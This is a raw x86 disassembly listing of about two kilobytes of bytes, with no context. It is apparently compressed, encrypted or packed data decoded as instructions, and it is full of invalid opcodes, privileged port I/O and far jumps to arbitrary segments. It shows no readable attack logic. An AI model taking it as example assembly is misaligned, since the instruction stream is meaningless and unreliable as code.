  41846e:	addr16 mov cl,0x8e
  418471:	add    esi,DWORD PTR ds:0x303c27a9
  418477:	adc    DWORD PTR [ecx],edi
  418479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41847a:	jae    0x41843b
  41847c:	sbb    ah,BYTE PTR [ecx-0x7b]
  41847f:	cmp    eax,0x212f918f
  418484:	push   eax
  418485:	pop    esi
  418486:	sbb    ebx,DWORD PTR [edx+esi*1]
  418489:	xchg   esi,eax
  41848a:	push   0xcb868ab9
  41848f:	lock mov bh,0xde
  418492:	les    esp,FWORD PTR [eax+ebx*1-0x6d]
  418496:	in     al,0x96
  418498:	neg    DWORD PTR [ecx-0x75]
  41849b:	push   ecx
  41849c:	mov    ?,WORD PTR [edi]
  41849e:	inc    ebx
  41849f:	scas   eax,DWORD PTR es:[edi]
  4184a0:	pop    ecx
  4184a1:	xchg   esp,eax
  4184a2:	pop    es
  4184a3:	pop    ebx
  4184a4:	and    BYTE PTR [edi],ah
  4184a6:	pop    es
  4184a7:	(bad)
  4184ac:	test   al,0xf0
  4184ae:	es dec eax
  4184b0:	add    DWORD PTR [eax],ebx
  4184b2:	mov    WORD PTR [eax+0x7d],fs
  4184b5:	(bad)  
  4184b7:	repnz xor cl,BYTE PTR [ecx+0x6e]
  4184bb:	test   dl,0x82
  4184be:	retf   0x6e2f
  4184c1:	mov    BYTE PTR [ebp-0x10],bh
  4184c4:	fdiv   DWORD PTR [eax+0x30]
  4184c7:	es clc 
  4184c9:	addr16 cs enter 0xcf7,0x74
  4184cf:	stos   BYTE PTR es:[edi],al
  4184d0:	push   0x8f8b0617
  4184d5:	cmp    ah,BYTE PTR [ecx-0x7c]
  4184d8:	sar    BYTE PTR fs:[esi+0x8585523],0xec
  4184e0:	int    0xd6
  4184e2:	dec    eax
  4184e3:	clc    
  4184e4:	sbb    BYTE PTR [esi+0x15],ch
  4184e7:	sti    
  4184e8:	out    0x6,al
  4184ea:	shl    BYTE PTR [edi],cl
  4184ec:	imul   eax,edx,0x74
  4184ef:	rcr    BYTE PTR [edx-0x753c3f5a],1
  4184f5:	std    
  4184f6:	fiadd  DWORD PTR [ebp-0x63a762e5]
  4184fc:	scas   eax,DWORD PTR es:[edi]
  4184fd:	fnsave fs:[edi-0x7b44186e]
  418504:	ficom  DWORD PTR [eax+0x11]
  418507:	in     eax,0x2
  418509:	stos   BYTE PTR es:[edi],al
  41850a:	add    DWORD PTR [ebp-0x21],ebx
  41850d:	scas   eax,DWORD PTR es:[edi]
  41850e:	int3   
  41850f:	push   esp
  418510:	jle    0x418584
  418512:	js     0x418501
  418514:	test   DWORD PTR [ecx-0x1480e7a3],0x94a1a634
  41851e:	xchg   dl,cl
  418520:	daa    
  418521:	fdivr  DWORD PTR ss:[esi-0x10]
  418525:	mov    edx,0x21d83175
  41852a:	dec    esi
  41852b:	push   edi
  41852c:	lea    ecx,[edi]
  41852e:	rcl    dl,1
  418530:	push   ecx
  418531:	mov    ch,0x3c
  418533:	or     ebp,DWORD PTR [eax+0x4f07d8fd]
  418539:	out    0xb9,al
  41853b:	xchg   esp,eax
  41853c:	out    0x17,al
  41853e:	cs out 0x36,eax
  418541:	cmc    
  418542:	int    0x38
  418544:	xchg   ebp,eax
  418545:	pop    esi
  418546:	je     0x41856a
  418548:	gs jmp 0x9126:0x5508daaf
  418550:	xchg   edx,eax
  418551:	dec    eax
  418552:	mov    eax,0x1e61f3fd
  418557:	repz into 
  418559:	inc    ecx
  41855a:	out    dx,eax
  41855b:	jns    0x418565
  41855d:	cmp    ebp,DWORD PTR ds:0x5385cccf
  418563:	sbb    eax,0xe8bb0a5f
  418568:	out    dx,al
  418569:	jns    0x4185ba
  41856b:	leave  
  41856c:	loope  0x41853f
  41856e:	inc    ecx
  41856f:	dec    ebp
  418570:	jnp    0x418547
  418572:	call   0x35c16815
  418577:	dec    eax
  418578:	pop    eax
  418579:	jle    0x4185c3
  41857b:	add    BYTE PTR [eax-0x1f],0xe2
  41857f:	mov    ebp,0x862e012e
  418584:	jne    0x418536
  418586:	jno    0x41853d
  418588:	ja     0x41855e
  41858a:	add    BYTE PTR [eax-0x154e73b7],bl
  418590:	or     eax,0x43abc91a
  418595:	call   0x18f0:0xb7300754
  41859c:	dec    eax
  41859d:	jbe    0x418564
  41859f:	xchg   esi,eax
  4185a0:	pop    es
  4185a1:	dec    eax
  4185a2:	lds    ebx,FWORD PTR [edx]
  4185a4:	xchg   ebx,eax
  4185a5:	pop    ecx
  4185a6:	jmp    DWORD PTR [eax-0x5f]
  4185a9:	repz pop es
  4185ab:	add    edi,DWORD PTR [edx+0x57]
  4185ae:	lar    esp,WORD PTR [edi-0x47]
  4185b2:	(bad)  
  4185b3:	cli    
  4185b4:	das    
  4185b5:	add    esp,DWORD PTR [eax+0x716b725d]
  4185bb:	sub    dh,BYTE PTR [ecx]
  4185bd:	pop    edx
  4185be:	imul   esi,DWORD PTR [ebx],0xb126ec9a
  4185c4:	jle    0x4185a2
  4185c6:	pusha  
  4185c7:	(bad)  
  4185c8:	xchg   edx,eax
  4185c9:	mov    ch,0x17
  4185cb:	xchg   ecx,eax
  4185cc:	cmp    eax,DWORD PTR [edx+ebx*1-0x2]
  4185d0:	in     eax,dx
  4185d1:	jl     0x41856e
  4185d3:	mov    edx,0x4533c811
  4185d8:	xlat   BYTE PTR ds:[ebx]
  4185d9:	fsubp  st(1),st
  4185db:	fistp  WORD PTR [ebx+edi*8]
  4185de:	and    ch,ch
  4185e0:	clc    
  4185e1:	cmc    
  4185e2:	pop    ds
  4185e3:	hlt    
  4185e4:	adc    edi,DWORD PTR [edx]
  4185e6:	pop    ecx
  4185e7:	sub    esi,DWORD PTR [eax+0x1f]
  4185ea:	xor    BYTE PTR [ebp+0x5d8482c4],bl
  4185f0:	and    dh,BYTE PTR [esi-0x2f]
  4185f3:	push   ss
  4185f4:	push   0x5c2b3cab
  4185f9:	sbb    al,0xbb
  4185fb:	dec    ebp
  4185fc:	cwde   
  4185fd:	add    eax,0x5670a23
  418602:	mov    edx,0x2deb9bfa
  418607:	hlt    
  418608:	xchg   edi,eax
  418609:	and    al,0xd0
  41860b:	outs   dx,DWORD PTR ds:[esi]
  41860c:	xor    al,0x13
  41860e:	fst    DWORD PTR [ecx]
  418610:	aad    0x8d
  418612:	xor    al,0x6d
  418614:	ret    0xba91
  418617:	lock add eax,0xc56ccd87
  41861d:	xchg   edi,eax
  41861e:	pop    eax
  41861f:	jp     0x4185cd
  418621:	add    dl,BYTE PTR [ebx+0xa5d7ec2]
  418627:	jb     0x41867e
  418629:	into   
  41862a:	scas   eax,DWORD PTR es:[edi]
  41862b:	sbb    DWORD PTR [ecx+0x4f],esi
  41862e:	pop    ebp
  41862f:	adc    BYTE PTR ds:0x1629e2a0,cl
  418635:	dec    edi
  418636:	push   esp
  418637:	sub    DWORD PTR [edi+0x452e61c6],edi
  41863d:	retf   0x7ee1
  418640:	clc    
  418641:	pop    edi
  418642:	ins    DWORD PTR es:[edi],dx
  418643:	adc    al,0x55
  418645:	jl     0x41867e
  418647:	addr16 retf 
  418649:	push   edx
  41864a:	xchg   edx,eax
  41864b:	call   0xed82:0x3e25b35f
  418652:	test   DWORD PTR [ecx],esi
  418654:	push   eax
  418655:	lock sbb DWORD PTR [ebp-0x3a669b8e],edx
  41865c:	dec    ebx
  41865d:	scas   al,BYTE PTR es:[edi]
  41865e:	mov    ds:0x68a2f741,al
  418663:	xchg   esp,eax
  418664:	repz xor eax,0x11f74f99
  41866a:	pushf  
  41866b:	add    bh,BYTE PTR ds:0xfc212d76
  418671:	data16 icebp 
  418673:	sbb    DWORD PTR [ecx],0xf07a2871
  418679:	inc    esp
  41867a:	lea    esi,ds:0xc3cefb2
  418680:	ror    bl,0x5c
  418683:	adc    al,0x8
  418685:	or     eax,0x50e64563
  41868a:	xchg   al,bl
  41868c:	dec    esp
  41868d:	push   ecx
  41868e:	stc    
  41868f:	loopne 0x418682
  418691:	pop    esi
  418692:	fnsave [esi+0x25]
  418695:	cmc    
  418696:	push   ebp
  418697:	add    DWORD PTR [ecx+0x35],ebx
  41869a:	jmp    0x316b:0xe2367bf
  4186a1:	int3   
  4186a2:	fbstp  TBYTE PTR [ecx-0x1a]
  4186a5:	in     al,dx
  4186a6:	in     al,dx
  4186a7:	cs dec esi
  4186a9:	sbb    al,BYTE PTR [ebx]
  4186ab:	dec    esp
  4186ac:	cmp    dl,BYTE PTR [edx+0x24]
  4186af:	jg     0x4186e3
  4186b1:	pop    edx
  4186b2:	std    
  4186b3:	adc    al,0xef
  4186b5:	out    0x18,eax
  4186b7:	ror    eax,1
  4186b9:	fcomp  DWORD PTR ds:0x18f56ff5
  4186bf:	rcr    BYTE PTR [edi-0x69],cl
  4186c2:	push   ebx
  4186c3:	sbb    bl,cl
  4186c5:	mov    ecx,0xeeede3f1
  4186ca:	xlat   BYTE PTR ds:[ebx]
  4186cb:	imul   edi,DWORD PTR [esi],0xd6485a10
  4186d1:	retf   
  4186d2:	loop   0x418675
  4186d4:	jbe    0x41874e
  4186d6:	dec    ecx
  4186d7:	inc    edx
  4186d8:	xchg   edi,eax
  4186d9:	pop    eax
  4186da:	fnstenv [ecx+eax*2-0xfc98424]
  4186e1:	xchg   edi,eax
  4186e2:	aaa    
  4186e3:	aam    0x8f
  4186e5:	xchg   ebx,eax
  4186e6:	mov    DWORD PTR ds:[edi+ecx*8],eax
  4186ea:	pop    DWORD PTR [eax]
  4186ec:	test   esp,ecx
  4186ee:	cmp    al,0xe6
  4186f0:	xlat   BYTE PTR ds:[ebx]
  4186f1:	mov    sp,0x54a3
  4186f5:	cli    
  4186f6:	cmp    dh,cl
  4186f8:	or     ebp,eax
  4186fa:	pop    sp
  4186fc:	repz sbb eax,0xd3f724df
  418702:	icebp  
  418703:	sub    DWORD PTR [ebx],0x9901f408
  418709:	xchg   ch,al
  41870b:	adc    eax,0x53c4ccf6
  418710:	sbb    al,0xd4
  418712:	xchg   bh,ch
  418714:	call   0x359d:0x8590ab84
  41871b:	pop    ds
  41871c:	aaa    
  41871d:	fsubrp st(5),st
  41871f:	rol    DWORD PTR [ebx],cl
  418721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418722:	and    cl,BYTE PTR [eax+0x3c]
  418725:	push   es
  418726:	popa   
  418727:	je     0x418749
  418729:	sub    DWORD PTR [edi],ecx
  41872b:	pop    ss
  41872c:	gs pop esi
  41872e:	call   0x450c:0xcaa18ef5
  418735:	inc    ebp
  418736:	mov    eax,0xc4a6e2ef
  41873b:	dec    esp
  41873c:	data16 vpaddd xmm4,xmm2,XMMWORD PTR [edx+0x57]
  418742:	fdivr  st(6),st
  418744:	and    al,0x93
  418746:	popf   
  418747:	fidivr DWORD PTR [ecx]
  418749:	xchg   edi,eax
  41874a:	cld    
  41874b:	inc    edi
  41874c:	sbb    dh,cl
  41874e:	mov    cl,0x61
  418750:	add    ah,BYTE PTR [ebx-0x41]
  418753:	inc    ebx
  418754:	(bad)  
  418755:	dec    ecx
  418756:	add    DWORD PTR [edx+0x69],esp
  418759:	add    ch,ch
  41875b:	pushf  
  41875c:	sti    
  41875d:	mov    cl,0x84
  41875f:	in     eax,dx
  418760:	rcr    DWORD PTR [ecx],1
  418762:	add    edx,ecx
  418764:	neg    edi
  418766:	jmp    0x418c78
  41876b:	ret    0xc43e
  41876e:	retf   0xcac4
  418771:	ret    0x85c6
  418774:	aad    0x2e
  418776:	leave  
  418777:	gs pushf 
  418779:	mov    ds:0x7fe02597,eax
  41877e:	js     0x4187f3
  418780:	jl     0x4187fa
  418782:	js     0x4187cc
  418784:	pop    ds
  418785:	dec    ebx
  418786:	mov    cl,0xbb
  418788:	or     edi,DWORD PTR [edx+0x3473a321]
  41878e:	inc    eax
  41878f:	int3   
  418790:	mov    esp,0x60d3b25e
  418795:	mov    edx,0x69c3033e
  41879a:	pop    edx
  41879b:	js     0x4187fe
  41879d:	mov    ds:0xc5aafb2b,al
  4187a2:	pop    eax
  4187a3:	xor    al,0xef
  4187a5:	sub    bl,BYTE PTR [eax+edi*2]
  4187a8:	inc    esp
  4187a9:	mov    ds:0x3db0bf87,al
  4187ae:	js     0x41876f
  4187b0:	mov    al,0x38
  4187b2:	cwde   
  4187b3:	out    0x80,al
  4187b5:	mov    ecx,0xc9cb1643
  4187ba:	jmp    0x94b57e5b
  4187bf:	mov    esi,0x1de7440b
  4187c4:	test   bl,cl
  4187c6:	adc    BYTE PTR [ebp-0x36],0xad
  4187ca:	push   ecx
  4187cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187cc:	xchg   DWORD PTR [edi],ebp
  4187ce:	fidivr WORD PTR [esi-0x4bc534f0]
  4187d4:	push   0x8616ceb8
  4187d9:	mov    dl,0x13
  4187db:	and    eax,0x3595448e
  4187e0:	mov    cl,0x2c
  4187e2:	pop    eax
  4187e3:	and    bl,BYTE PTR [eax+0x3943a61f]
  4187e9:	adc    eax,0x558fcc25
  4187ee:	mov    eax,0xf062c566
  4187f3:	jnp    0x4187a0
  4187f5:	add    DWORD PTR [ecx+0x3],eax
  4187f8:	cmp    al,0x21
  4187fa:	sub    eax,0xf6e0df20
  4187ff:	pop    eax
  418800:	nop
  418801:	imul   BYTE PTR ds:0x7d387121
  418807:	aas    
  418808:	add    BYTE PTR [ebx],0x85
  41880b:	pop    esi
  41880c:	fimul  DWORD PTR ds:0xb421bb5e
  418812:	jne    0x4187c9
  418814:	dec    esp
  418815:	pop    esp
  418816:	es in  al,dx
  418818:	adc    BYTE PTR [eax+0x5b1402a3],bh
  41881e:	add    ebp,edi
  418820:	or     edi,DWORD PTR [esi-0x60ebabb2]
  418826:	push   ecx
  418827:	pop    esp
  418828:	hlt    
  418829:	inc    esi
  41882a:	sbb    al,0x5f
  41882c:	loope  0x418803
  41882e:	dec    edx
  41882f:	xor    dh,dl
  418831:	push   ss
  418832:	jge    0x4187db
  418834:	inc    esi
  418835:	inc    esi
  418836:	out    dx,eax
  418837:	mov    dh,0x23
  418839:	loope  0x41881e
  41883b:	xor    eax,0x2e2b92e9
  418840:	popf   
  418841:	or     BYTE PTR [esi],cl
  418843:	fadd   QWORD PTR [ebp-0x67]
  418846:	bound  ebx,QWORD PTR [ebp+0x7bb866d]
  41884c:	xchg   DWORD PTR [edx+0x41],esp
  41884f:	cmp    al,0xbf
  418851:	or     ch,BYTE PTR [ecx+0x15f303a2]
  418857:	pusha  
  418858:	push   esi
  418859:	jno    0x41886f
  41885b:	xchg   ebx,eax
  41885c:	or     eax,0x3c6ce8ec
  418861:	add    dl,al
  418863:	sti    
  418864:	push   edx
  418865:	push   0xea12ac5b
  41886a:	mov    dl,cl
  41886c:	pop    esp
  41886d:	mov    ah,0x2e
  41886f:	push   ebx
  418870:	and    al,0x15
  418872:	inc    eax
  418873:	repz xor dl,BYTE PTR [eax+eax*1+0x4b97f3c9]
  41887b:	inc    ebx
  41887c:	pop    ds
  41887d:	aad    0xa5
  41887f:	mov    cl,0x8c
  418881:	adc    BYTE PTR [edi],al
  418883:	xchg   esp,eax
  418884:	pop    ss
  418885:	or     cl,BYTE PTR [ecx+0x73]
  418888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418889:	test   al,0x44
  41888b:	imul   ebx,DWORD PTR [edi-0x22ed1b65],0x4aa92b68
  418895:	dec    ecx
  418896:	jle    0x4188ce
  418898:	adc    esp,ecx
  41889a:	pop    eax
  41889b:	mov    ds:0x8dcfb875,eax
  4188a0:	repnz in al,dx
  4188a2:	inc    ebp
  4188a3:	or     al,0x7b
  4188a5:	cdq    
  4188a6:	(bad)  [eax+0x667d8211]
  4188ac:	mov    cl,BYTE PTR [ebx]
  4188ae:	into   
  4188af:	mov    bl,0x6
  4188b1:	aad    0x52
  4188b3:	iret   
  4188b4:	push   ebx
  4188b5:	jno    0x418890
  4188b7:	push   ecx
  4188b8:	pop    ds
  4188b9:	inc    edx
  4188ba:	push   ecx
  4188bb:	aad    0xe5
  4188bd:	shl    DWORD PTR [ecx+eax*1-0x663f336c],cl
  4188c4:	mov    BYTE PTR [esi+ebx*8],bl
  4188c7:	mov    ebx,0x8b63a8e2
  4188cc:	cld    
  4188cd:	retf   0xa419
  4188d0:	mov    BYTE PTR [ebp+0x60],dh
  4188d3:	leave  
  4188d4:	mov    dh,0x6f
  4188d6:	or     ebp,eax
  4188d8:	and    al,BYTE PTR [ecx+ebp*1-0x7a]
  4188dc:	jae    0x4188b2
  4188de:	(bad)
  4188e1:	loopne 0x418875
  4188e3:	fbld   TBYTE PTR [esi-0x71b6b9e9]
  4188e9:	pop    edx
  4188ea:	add    edx,DWORD PTR [edx]
  4188ec:	imul   ecx,ecx,0xffffffb9
  4188ef:	popf   
  4188f0:	in     al,dx
  4188f1:	fisub  WORD PTR [eax+ebp*1]
  4188f4:	dec    ecx
  4188f5:	ds je  0x4188ca
  4188f8:	(bad)  
  4188fa:	xchg   ch,cl
  4188fc:	mov    dl,0x74
  4188fe:	ret    
  4188ff:	arpl   WORD PTR [ebx+0x5],sp
  418902:	adc    al,0x9b
  418904:	add    al,0x8b
  418906:	or     eax,0x88855b28
  41890b:	in     eax,dx
  41890c:	sub    eax,0x1825664e
  418911:	xchg   esi,eax
  418912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418913:	pusha  
  418914:	repz fmul st,st(1)
  418917:	inc    edx
  418918:	jb     0x4188d2
  41891a:	imul   esp,DWORD PTR [eax],0xb48253ac
  418920:	fs xchg ecx,eax
  418922:	mov    ch,0x34
  418924:	or     ch,BYTE PTR [esi]
  418926:	ja     0x41895d
  418928:	cli    
  418929:	cmc    
  41892a:	(bad)  [edi-0x6b]
  41892d:	mov    bl,0xcf
  41892f:	mov    ebp,0x7e255c67
  418934:	xor    DWORD PTR [esp+ebx*1],0x957deee6
  41893b:	rol    DWORD PTR [esi-0x1049d93],1
  418941:	and    dh,dh
  418943:	cmp    al,0x39
  418945:	into   
  418946:	outs   dx,DWORD PTR ds:[esi]
  418947:	sub    DWORD PTR [eax+0x57],ecx
  41894a:	shr    DWORD PTR [ebx+0x2e],0xea
  41894e:	mov    WORD PTR [eax+0x18],?
  418951:	adc    bl,bh
  418953:	mov    ah,0xe1
  418955:	sbb    al,0x4e
  418957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418958:	outs   dx,BYTE PTR ds:[esi]
  418959:	ins    BYTE PTR es:[edi],dx
  41895a:	jg     0x4188dc
  41895c:	push   es
  41895d:	sbb    edx,DWORD PTR [edi]
  41895f:	sbb    DWORD PTR [ecx],edx
  418961:	pusha  
  418962:	jmp    0x4189a2
  418964:	pushf  
  418965:	sub    ebx,DWORD PTR [ecx-0x3e]
  418968:	or     eax,0x754d1c22
  41896d:	fild   WORD PTR fs:[ecx-0x73]
  418971:	adc    eax,0x1169419a
  418976:	xor    eax,0x2363f598
  41897b:	or     DWORD PTR [ecx-0x4c],eax
  41897e:	add    BYTE PTR [ebx],bh
  418980:	xchg   BYTE PTR [eax+0x67581b1f],bh
  418986:	hlt    
  418987:	dec    esi
  418988:	out    dx,eax
  418989:	(bad)  
  41898a:	fiadd  DWORD PTR [ebp+0x41]
  41898d:	cwde   
  41898e:	int3   
  41898f:	sbb    eax,0x270e9ccc
  418994:	push   cs
  418995:	mov    ds:0x4be58eb2,eax
  41899a:	add    ch,0x1a
  41899d:	inc    edi
  41899e:	enter  0x21,0xe5
  4189a2:	mov    edx,0x3aa264d
  4189a7:	pop    edi
  4189a8:	pop    ds
  4189a9:	xchg   ecx,eax
  4189aa:	inc    ecx
  4189ab:	jbe    0x41897d
  4189ad:	(bad)  
  4189ae:	xor    bl,BYTE PTR [ebx+0x7d]
  4189b1:	mov    ebx,DWORD PTR [esi+0x790894e3]
  4189b7:	sbb    eax,0x7148cc41
  4189bc:	fwait
  4189bd:	out    dx,eax
  4189be:	outs   dx,BYTE PTR ds:[esi]
  4189bf:	push   cs
  4189c0:	in     eax,0x38
  4189c2:	inc    ecx
  4189c3:	xchg   edx,eax
  4189c4:	mov    fs,WORD PTR [ecx+edi*8-0x636a6766]
  4189cb:	iret   
  4189cc:	and    DWORD PTR [ebp-0x12],0x5e72d7f5
  4189d3:	hlt    
  4189d4:	mov    ch,0x63
  4189d6:	mov    dh,0xeb
  4189d8:	popa   
  4189d9:	pop    esi
  4189da:	repz and al,0xa3
  4189dd:	cmp    bh,cl
  4189df:	xor    eax,0xb4bc03c8
  4189e4:	cmp    BYTE PTR [esi],dl
  4189e6:	int3   
  4189e7:	sbb    al,0x3e
  4189e9:	sbb    BYTE PTR [ebx-0x18cc5b61],cl
  4189ef:	retf   0xf91e
  4189f2:	cwde   
  4189f3:	scas   al,BYTE PTR es:[edi]
  4189f4:	cs ja  0x418994
  4189f7:	sbb    DWORD PTR [edi-0x653db561],edi
  4189fd:	inc    esp
  4189fe:	mov    dh,0xda
  418a00:	mov    bh,bl
  418a02:	push   ecx
  418a03:	add    eax,0x532debb6
  418a08:	mov    WORD PTR [ebp+0x5f38b2e1],?
  418a0e:	fmul   DWORD PTR [ebx]
  418a10:	add    dh,bh
  418a12:	cmp    ebp,esp
  418a14:	push   0xe4db1116
  418a19:	lods   al,BYTE PTR ds:[esi]
  418a1a:	adc    DWORD PTR [edi-0x67838249],ecx
  418a20:	mov    ch,0x45
  418a22:	xchg   esi,eax
  418a23:	(bad)  ds:0xb7187ca1
  418a29:	je     0x418a14
  418a2b:	xchg   ecx,eax
  418a2c:	push   0xffffff9a
  418a2e:	dec    eax
  418a2f:	stos   BYTE PTR es:[edi],al
  418a30:	cmc    
  418a31:	adc    bh,BYTE PTR [ebx]
  418a33:	ja     0x4189e2
  418a35:	jb     0x4189d7
  418a37:	sbb    dh,BYTE PTR [edx+0x43]
  418a3a:	cmp    ecx,DWORD PTR [ebp-0x76580f4e]
  418a40:	jmp    0x418a84
  418a42:	out    0x14,al
  418a44:	rcr    dl,cl
  418a46:	aas    
  418a47:	add    BYTE PTR gs:[ebp-0x78],bh
  418a4b:	mov    esp,0x26984f74
  418a50:	push   ebp
  418a51:	lahf   
  418a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a53:	inc    esi
  418a54:	jae    0x418a1b
  418a56:	lahf   
  418a57:	or     eax,0xebc487fb
  418a5c:	pop    ss
  418a5d:	fild   QWORD PTR [esi+eiz*1+0x7d]
  418a61:	popa   
  418a62:	inc    DWORD PTR [edx-0x833e6a2]
  418a68:	ja     0x418a31
  418a6a:	lock das 
  418a6c:	das    
  418a6d:	(bad)  
  418a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a6f:	mov    eax,0x15d5a0be
  418a74:	push   ebp
  418a75:	xor    DWORD PTR [edx],0xffffff91
  418a78:	mov    BYTE PTR [ebx],0xdf
  418a7b:	sub    bl,cl
  418a7d:	or     BYTE PTR [edx],bl
  418a7f:	stc    
  418a80:	fisubr WORD PTR [esi-0x277d1deb]
  418a86:	fucom  st(5)
  418a88:	bound  edx,QWORD PTR [edx-0x1c]
  418a8b:	dec    ebp
  418a8c:	sti    
  418a8d:	retf   
  418a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a8f:	shl    DWORD PTR [eax-0x2d6e3f06],0x7b
  418a96:	test   al,0x44
  418a98:	fcomip st,st(1)
  418a9a:	mov    ds:0x6978cbb5,al
  418a9f:	jmp    FWORD PTR [edi]
  418aa1:	in     eax,0x80
  418aa3:	cdq    
  418aa4:	sub    bl,BYTE PTR [ebx-0x238936f9]
  418aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aab:	mov    eax,0x4b294a4a
  418ab0:	clc    
  418ab1:	dec    edx
  418ab2:	fisub  DWORD PTR [ecx+0x3f]
  418ab5:	sub    DWORD PTR [ebx-0x5665b2ef],ebp
  418abb:	sub    al,0x4b
  418abd:	fsubr  QWORD PTR [ebp-0x103bd21a]
  418ac3:	(bad)  
  418ac4:	jmp    0x418b06
  418ac6:	fisub  WORD PTR [edx+0x3740729d]
  418acc:	jno    0x418af3
  418ace:	sbb    al,0x7
  418ad0:	sahf   
  418ad1:	cmc    
  418ad2:	mov    al,ds:0x232c1dc3
  418ad7:	imul   eax,DWORD PTR [ecx+0x21],0x3acf3fb4
  418ade:	ror    BYTE PTR [esi+0x47],1
  418ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ae2:	shr    BYTE PTR [edx+edx*8+0x1ca33924],0x1d
  418aea:	inc    edx
  418aeb:	pop    eax
  418aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aed:	or     DWORD PTR [edx-0x30],esp
  418af0:	retf   
  418af1:	mov    al,0xf2
  418af3:	mov    al,0xfa
  418af5:	or     eax,0xf2fcb321
  418afa:	stos   DWORD PTR es:[edi],eax
  418afb:	pop    esi
  418afc:	xchg   edx,eax
  418afd:	fldenv [esi-0x5bf06eff]
  418b03:	pusha  
  418b04:	xor    cl,al
  418b06:	in     al,dx
  418b07:	fyl2xp1 
  418b09:	add    al,0x20
  418b0b:	arpl   WORD PTR [edi+0x144d1716],sp
  418b11:	jae    0x418b6c
  418b13:	out    0xe7,eax
  418b15:	loope  0x418b4c
  418b17:	mov    ds:0x50360284,eax
  418b1c:	hlt    
  418b1d:	sbb    edi,eax
  418b1f:	cmp    eax,0x1456c257
  418b24:	aas    
  418b25:	mov    al,ds:0xe1fde51f
  418b2a:	inc    DWORD PTR [edx]
  418b2c:	sub    esp,DWORD PTR [ebp-0x587bc97]
  418b32:	lods   eax,DWORD PTR ds:[esi]
  418b33:	cmc    
  418b34:	test   eax,0xa37b781e
  418b39:	jnp    0x418b1e
  418b3b:	cmp    BYTE PTR [edi],ch
  418b3d:	pop    ds
  418b3e:	es mov eax,0x9b3865ce
  418b44:	inc    ebx
  418b45:	bound  esp,QWORD PTR [eax-0x2f]
  418b48:	aaa    
  418b49:	mov    al,ds:0xb3e8e97d
  418b4e:	push   esi
  418b4f:	and    esi,DWORD PTR [ecx-0xa6d0a90]
  418b55:	pop    ebx
  418b56:	or     edx,DWORD PTR [edx+0x13]
  418b59:	xchg   esp,ebx
  418b5b:	ret    
  418b5c:	jmp    0xdc197a28
  418b61:	push   ecx
  418b62:	sahf   
  418b63:	cmp    al,0x90
  418b65:	repz jp 0x418be7
  418b68:	div    BYTE PTR [edi]
  418b6a:	shl    DWORD PTR [ebx+edi*8-0x11],0x46
  418b6f:	push   0xd
  418b71:	inc    esi
  418b72:	sub    al,0x80
  418b74:	les    esp,FWORD PTR [edx]
  418b76:	xchg   edi,eax
  418b77:	mov    bl,al
  418b79:	push   ds
  418b7a:	rcr    BYTE PTR [eax-0x330add85],1
  418b80:	cmp    DWORD PTR [eax+0x13],ecx
  418b83:	ja     0x418bb7
  418b85:	loop   0x418b1c
  418b87:	stos   DWORD PTR es:[edi],eax
  418b88:	jl     0x418bc0
  418b8a:	pop    ds
  418b8b:	shl    BYTE PTR [edi+eax*1+0xb317a4f],0x14
  418b93:	adc    bl,bh
  418b95:	loopne 0x418bb8
  418b97:	fbld   TBYTE PTR [ebx-0x697f52a5]
  418b9d:	mov    dl,dh
  418b9f:	es add edx,ecx
  418ba2:	into   
  418ba3:	icebp  
  418ba4:	jb     0x418bb0
  418ba6:	dec    ecx
  418ba7:	sub    bh,BYTE PTR [edx]
  418ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418baa:	jp     0x418bf9
  418bac:	sbb    DWORD PTR [edi],esp
  418bae:	and    DWORD PTR [edx-0x18382d94],esp
  418bb4:	add    al,0xd6
  418bb6:	mov    al,ds:0x5fabbcd2
  418bbb:	das    
  418bbc:	(bad)  
  418bbd:	ffree  st(2)
  418bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc0:	mov    esi,0x24daff4b
  418bc5:	out    dx,eax
  418bc6:	and    ah,BYTE PTR [edi+0x3e]
  418bc9:	icebp  
  418bca:	lea    ecx,[eax+0x15]
  418bcd:	mov    ch,dl
  418bcf:	mov    eax,ds:0xeba12dfa
  418bd4:	push   0x1c9b4d6f
  418bd9:	pushf  
  418bda:	sub    edi,DWORD PTR ds:0xbb075f58
  418be0:	das    
  418be1:	gs out 0x21,eax
  418be4:	cdq    
  418be5:	adc    ecx,DWORD PTR [ecx]
  418be7:	pusha  
  418be8:	jae    0x418b9b
  418bea:	mov    esi,0xb24e0d80
  418bef:	xor    ebx,DWORD PTR [ebx-0x5c19810b]
  418bf5:	sbb    al,0x93
  418bf7:	fsubr  QWORD PTR [edx+0x7b80fed0]
  418bfd:	jge    0x418bc9
  418bff:	xor    dl,al
  418c01:	push   eax
  418c02:	push   esi
  418c03:	ins    BYTE PTR es:[edi],dx
  418c04:	push   es
  418c05:	retf   
  418c06:	imul   esp,DWORD PTR [esi-0x2a08a826],0xedb3fda7
  418c10:	sar    DWORD PTR [eax+0x11],cl
  418c13:	sti    
  418c14:	xlat   BYTE PTR ds:[ebx]
  418c15:	(bad)  
  418c17:	cmp    al,0xdb
  418c19:	push   0x921f01ef
  418c1e:	sbb    eax,0x749dc81
  418c23:	ins    DWORD PTR es:[edi],dx
  418c24:	je     0x418bdb
  418c26:	cmp    ebp,eax
  418c28:	cmp    dh,al
  418c2a:	ja     0x418c45
  418c2c:	mov    eax,ds:0xc308134e
  418c31:	mov    bl,0xfc
  418c33:	cmp    BYTE PTR [ebp-0x52ccc31d],0x9b
  418c3a:	sub    eax,ebx
  418c3c:	inc    esi
  418c3d:	pop    ds
  418c3e:	ins    BYTE PTR es:[edi],dx
  418c3f:	push   esi
  418c40:	fild   DWORD PTR [ebx+0x43]
  418c43:	vmread DWORD PTR [edx-0x2199fe76],ebp
